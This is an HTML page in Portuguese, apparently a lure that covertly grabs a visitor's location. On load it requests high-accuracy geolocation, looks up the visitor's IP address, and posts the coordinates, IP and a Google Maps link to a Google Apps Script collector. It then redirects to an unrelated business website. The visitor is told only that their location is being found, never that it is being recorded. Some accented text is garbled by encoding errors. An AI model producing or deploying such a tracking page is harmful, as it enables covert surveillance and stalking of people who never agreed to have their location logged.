<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Localizando...</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      text-align: center;
    }
  </style>
  <script>
    // Substitua esta URL pela URL do seu Web App do Google Apps Script
    const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbyHbb0FGf7l84Ulyz3pgGulkE8LCLR01STF6cl34sPRcE6NBspJCDETR40BJaPdlsd3YA/exec'; // <<< SUBSTITUA AQUI!

    window.onload = function() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sucesso, erro, {
          enableHighAccuracy: true, // Tenta obter a melhor precis칚o poss칤vel
          timeout: 10000,           // Tempo m치ximo para obter a localiza칞칚o (10 segundos)
          maximumAge: 0             // For칞a a obten칞칚o de uma nova localiza칞칚o a cada vez
        });
      } else {
        document.body.innerHTML = "<p>Seu navegador n칚o suporta geolocaliza칞칚o.</p>";
        // Redireciona mesmo se n칚o suportar geolocaliza칞칚o
        redirecionaInstagram();
      }
    };

    async function sucesso(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // URL correta para o Google Maps
      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

      try {
        // Captura o IP do visitante
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip;

        // Envia os dados para sua planilha no Google Sheets (via Google Apps Script)
        const response = await fetch(WEBAPP_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            latitude: latitude,
            longitude: longitude,
            ip: ip,
            maps: mapsLink
          })
        });

        const result = await response.json(); // Pega a resposta JSON do Apps Script

        if (result.success) {
          console.log("Dados registrados com sucesso no Google Sheets!");
        } else {
          console.error("Erro ao registrar os dados no Google Sheets:", result.message);
          // Opcional: mostrar uma mensagem de erro para o usu치rio
        }

      } catch (error) {
        console.error("Erro na requisi칞칚o ou processamento dos dados:", error);
        // Opcional: mostrar uma mensagem de erro para o usu치rio
      } finally {
        // Ap칩s a tentativa de registro (sucesso ou falha), redireciona
        redirecionaInstagram();
      }
    }

    function erro(err) {
      console.warn("Geolocaliza칞칚o n칚o permitida ou erro:", err);
      let errorMessage = "丘멆잺 칄 necess치rio permitir a localiza칞칚o para continuar.";
      switch(err.code) {
        case err.PERMISSION_DENIED:
          errorMessage = "Permiss칚o de localiza칞칚o negada. Por favor, permita para continuar.";
          break;
        case err.POSITION_UNAVAILABLE:
          errorMessage = "Localiza칞칚o indispon칤vel. Tente novamente mais tarde.";
          break;
        case err.TIMEOUT:
          errorMessage = "Tempo esgotado para obter a localiza칞칚o. Verifique sua conex칚o.";
          break;
        case err.UNKNOWN_ERROR:
          errorMessage = "Ocorreu um erro desconhecido ao obter a localiza칞칚o.";
          break;
      }
      document.body.innerHTML = `<p>${errorMessage}</p>`;
      // Redireciona mesmo se houver erro de geolocaliza칞칚o, ap칩s exibir a mensagem
      setTimeout(redirecionaInstagram, 3000); // Redireciona ap칩s 3 segundos para o usu치rio ler a mensagem
    }

    function redirecionaInstagram() {
      window.location.href = "https://www.despachanteespindola.com/";
    }
  </script>
</head>
<body>
  <p>游늸 Obtendo sua localiza칞칚o... Aguarde...</p>
</body>
</html>
